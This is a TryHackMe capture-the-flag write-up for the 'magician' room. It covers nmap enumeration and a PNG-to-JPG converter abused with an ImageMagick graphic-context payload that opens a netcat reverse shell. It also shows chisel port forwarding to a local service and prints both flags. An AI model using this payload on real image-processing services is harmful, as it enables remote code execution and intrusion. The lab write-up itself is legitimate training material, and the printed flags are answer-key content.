## magician - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/magician)

<i>Note: this machine needs about 7 minutes to start up, please be patient :)

Please add the IP address of this machine with the hostname "magician" to your /etc/hosts file on Linux before you start.
On Windows, the hosts file should be at C:\Windows\System32\drivers\etc\hosts.

Use the hostname instead of the IP address if you want to upload a file. This is required for the room to work correctly ;)

Have fun and use your magic skills!</i>

**IP: 10.10.167.76**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Web <br>

**Tools Used**: Nmap, Chisel<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- First add IP to `/etc/hosts` and then do the Nmap scan.

  ```
  nmap -sC -sV -T5 -p- magician

  PORT     STATE SERVICE VERSION
  21/tcp   open  ftp     vsftpd 2.0.8 or later
  8080/tcp open  http    Apache Tomcat (language: en)
  |_http-title: Site doesn't have a title (application/json).
  8081/tcp open  http    nginx 1.14.0 (Ubuntu)
  |_http-title: magician
  |_http-server-header: nginx/1.14.0 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- Visited the web page `http://magician:8081/` where you can convert `.png` to `.jpg`. I instantly googled convert png exploit and found that PayloadsAllTheThings have everything I need. This is the exploit for reverse shell.

  ```
  cat img.png
  push graphic-context
  encoding "UTF-8"
  viewbox 0 0 1 1
  affine 1 0 0 1 0 0
  push graphic-context
  image Over 0,0 1,1 '|mkfifo /tmp/gjdpez; nc [YOUR-THM-IP] 4444 0</tmp/gjdpez | /bin/sh >/tmp/gjdpez 2>&1; rm /tmp/gjdpez '
  pop graphic-context
  pop graphic-context
  ```
  
- Start a listener and upload shell, you should get a connection.

  ```
  nc -lvnp 4444           
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.167.76] 53524
  whoami
  magician
  id
  uid=1000(magician) gid=1000(magician) groups=1000(magician)
  ```

- Change it to putty and start looking for flags.

---

## 🧍 User Privilege Escalation

- First flag is already there with additional note.

  ```
  magician@magician:/home$ cd magician/
  magician@magician:~$ ls -la
  total 17204
  drwxr-xr-x 5 magician magician     4096 Feb 13  2021 .
  drwxr-xr-x 3 root     root         4096 Jan 30  2021 ..
  lrwxrwxrwx 1 magician magician        9 Feb  6  2021 .bash_history -> /dev/null
  -rw-r--r-- 1 magician magician      220 Apr  4  2018 .bash_logout
  -rw-r--r-- 1 magician magician     3771 Apr  4  2018 .bashrc
  drwx------ 2 magician magician     4096 Jan 30  2021 .cache
  drwx------ 3 magician magician     4096 Jan 30  2021 .gnupg
  -rw-r--r-- 1 magician magician      807 Apr  4  2018 .profile
  -rw-r--r-- 1 magician magician        0 Jan 30  2021 .sudo_as_admin_successful
  -rw------- 1 magician magician     7546 Jan 31  2021 .viminfo
  -rw-r--r-- 1 root     root     17565546 Jan 30  2021 spring-boot-magician-backend-0.0.1-SNAPSHOT.jar
  -rw-r--r-- 1 magician magician      170 Feb 13  2021 the_magic_continues
  drwxr-xr-x 2 root     root         4096 Feb  5  2021 uploads
  -rw-r--r-- 1 magician magician       24 Jan 30  2021 user.txt
  
  magician@magician:~$ cat user.txt 
  THM{simsalabim_hex_hex}
  ```

  ```
  magician@magician:~$ cat the_magic_continues 
  The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
  ```
  
- Now let's get the root flag.

---

## 👑 Root Privilege Escalation

- Note was pretty helpful, I ran `netstat -l` and found a way to root.

  ```
  magician@magician:~$ netstat -l
  Active Internet connections (only servers)
  Proto Recv-Q Send-Q Local Address           Foreign Address         State      
  tcp        0      0 localhost:6666          0.0.0.0:*               LISTEN
  [SNIP!]
  ```
  
- Now it's `chisel` time, move the binary to target machine and start `chisel` from your Kali. From target machine run chisel client and after it visit `localhost:PORT` and you can read the flag there with simple command.

  ```
  KALI:
  chisel server --reverse --port 9999

  TARGET:
  /chisel client [YOUR-THM-IP]:9999 R:8888:127.0.0.1:6666

  visit localhost:8888
  ```
  
- Root flag is encoded so do some decoding as well.

---

## 🏁 Flags

- **User Flag**: `THM{simsalabim_hex_hex}`
- **Root Flag**: `THM{magic_may_make_many_men_mad}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding my way around finishing the CTF.`

- What did I learn?
  `Practiced port forwarding and learned new file upload vulnerability.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
